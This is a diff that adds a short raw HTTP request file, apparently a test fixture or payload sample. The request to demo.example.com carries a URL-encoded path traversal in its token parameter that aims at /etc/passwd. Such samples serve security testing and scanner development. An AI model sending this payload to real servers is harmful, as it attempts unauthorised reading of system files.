@@ -1,0 +1,4 @@
+GET /a?token='%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
